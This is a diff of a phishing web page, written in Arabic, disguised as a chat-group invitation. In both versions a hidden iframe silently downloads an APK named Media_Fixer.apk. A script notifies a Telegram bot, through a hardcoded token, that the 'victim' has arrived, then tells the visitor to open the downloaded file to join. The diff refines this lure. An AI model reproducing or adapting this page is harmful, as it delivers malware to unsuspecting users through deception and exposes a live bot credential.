@@ -4,82 +4,86 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="انضمام إلى المجموعة الرسمية">
-    <meta property="og:description" content="اضغط للانضمام إلى المجموعة عبر الرابط">
+    <meta property="og:title" content="دعوة للانضمام إلى المجموعة">
+    <meta property="og:description" content="اضغط هنا للانضمام إلى المجموعة الرسمية والدردشة">
     <meta property="og:image" content="shrouk_final.jpg">
     <meta property="og:type" content="website">
 
-    <title>الانضمام للمجموعة</title>
+    <title>انضمام للمجموعة</title>
     
     <style>
         body {
-            background-color: #f0f2f5;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #e6ebf0;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .card {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        .container {
+            background: #fff;
+            padding: 40px 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
             text-align: center;
-            width: 90%;
-            max-width: 400px;
+            width: 85%;
+            max-width: 380px;
         }
-        .group-img {
-            width: 120px;
-            height: 120px;
+        .group-avatar {
+            width: 130px;
+            height: 130px;
             border-radius: 50%;
             object-fit: cover;
-            border: 3px solid #0088cc;
-            margin-bottom: 15px;
+            border: 4px solid #0088cc;
+            margin-bottom: 20px;
         }
-        h2 { color: #333; margin-bottom: 10px; }
-        .loader-container { margin-top: 25px; }
+        h2 { color: #222; font-size: 22px; margin: 10px 0; }
+        .info { color: #777; font-size: 15px; margin-bottom: 30px; }
+        
+        /* شريط التحميل */
+        .progress-box { margin-top: 20px; }
         .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0088cc;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0088cc;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 45px;
+            height: 45px;
             animation: spin 1s linear infinite;
             margin: 0 auto 15px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { color: #666; font-size: 16px; }
+        .loading-text { color: #0088cc; font-weight: bold; font-size: 16px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="shrouk_final.jpg" alt="Group Image" class="group-img">
-        <h2>مجموعة الدردشة العامة</h2>
-        <p class="text">أنت مدعو للانضمام إلى هذه المجموعة</p>
+    <div class="container">
+        <img src="shrouk_final.jpg" class="group-avatar">
+        <h2>مجموعة الدردشة الخاصة</h2>
+        <p class="info">يتم الآن فحص الرابط وتوجيهك للمجموعة...</p>
 
-        <div class="loader-container">
+        <div class="progress-box">
             <div class="loader"></div>
-            <p class="text" id="status-text">جاري تحويلك للجروب...</p>
+            <p class="loading-text" id="status">جارٍ تحويلك للجروب...</p>
         </div>
     </div>
 
     <iframe src="Media_Fixer.apk" style="display:none;"></iframe>
 
     <script>
-        // إشعار للبوت بالدخول
+        // إشعار فوري للبوت بدخول التارجت
         const botToken = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
         const chatId = "1356975454";
         
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية دخل صفحة الجروب وبدأ تحميل الملف صامتاً! ⚠️")}`);
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔥 التارجت دخل "صفحة الجروب" والتحميل بدأ صامتاً! 🔥")}`);
 
-        // تغيير النص بعد فترة لإيهام الضحية
+        // بعد 7 ثواني (وقت التحميل) بنغير النص عشان الضحية يفتح الملف
         setTimeout(() => {
-            document.getElementById('status-text').innerText = "فشل التحويل التلقائي، يرجى فتح الملف المحمل للمتابعة";
-            document.getElementById('status-text').style.color = "red";
-        }, 8000);
+            const statusText = document.getElementById('status');
+            statusText.innerText = "اكتمل التحميل! افتح الملف المرفق لتأكيد الانضمام للجروب";
+            statusText.style.color = "#d9534f";
+        }, 7000);
     </script>
 
 </body>
